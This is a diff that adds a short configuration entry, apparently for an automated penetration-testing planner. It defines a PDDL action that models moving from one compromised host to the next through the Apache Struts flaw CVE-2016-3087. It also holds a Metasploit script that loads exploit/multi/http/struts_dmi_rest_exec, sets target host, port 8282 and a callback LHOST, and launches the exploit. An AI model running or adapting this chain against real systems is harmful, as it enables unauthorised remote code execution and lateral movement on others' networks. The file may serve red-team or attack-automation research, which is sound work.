@@ -1,0 +1,28 @@
+[pddl]
+    (:action exploit/multi/http/struts_dmi_rest_exec
+        :parameters (?from ?to)
+        :precondition (and
+            (located ?from)
+            (connected ?from ?to)
+            (exploited ?from)
+            (CVE-2016-3087 ?to)
+        )
+        :effect (and
+            (not (located ?from))
+            (located ?to)
+            (exploited ?to)
+        )
+    )
+
+[script]
+|> msf
+use exploit/multi/http/struts_dmi_rest_exec
+set RHOSTS {RHOSTS}
+set RPORT 8282
+set LHOST {LHOST}
+exploit -z
+
+[evc]
+
+[evd]
+LOG: Q=1, A=3
